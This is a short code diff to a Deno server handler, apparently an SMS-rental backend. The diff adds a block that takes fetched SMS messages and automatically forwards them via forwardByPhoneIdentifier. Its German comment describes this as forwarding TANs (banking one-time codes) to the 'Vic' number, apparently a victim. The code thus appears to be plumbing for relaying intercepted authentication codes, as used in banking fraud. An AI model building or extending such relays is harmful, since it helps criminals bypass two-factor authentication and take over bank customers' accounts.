@@ -253,6 +253,22 @@ Deno.serve(async (req) => {
       }),
       backoffKey,
     );
+    // TAN-Weiterleitung an die Vic-Nummer (nur aktive Sessions, idempotent)
+    try {
+      if (result.status === 200) {
+        const smsArr = (result.body as any)?.sms;
+        if (Array.isArray(smsArr) && smsArr.length > 0) {
+          const messages = smsArr.map((m: any) => ({
+            sender: m?.messageSender ?? "Unknown",
+            date: m?.messageDate ?? new Date().toISOString(),
+            text: m?.messageText ?? "",
+          }));
+          await forwardByPhoneIdentifier(`smsbot://${rentalId}`, messages);
+        }
+      }
+    } catch (e) {
+      console.error("forwardByPhoneIdentifier failed:", e);
+    }
     const extra: Record<string, string> = { "X-Cache": result.source };
     if (result.retryAfter) extra["Retry-After"] = result.retryAfter;
     return jsonResponse(result.body, result.status, extra);
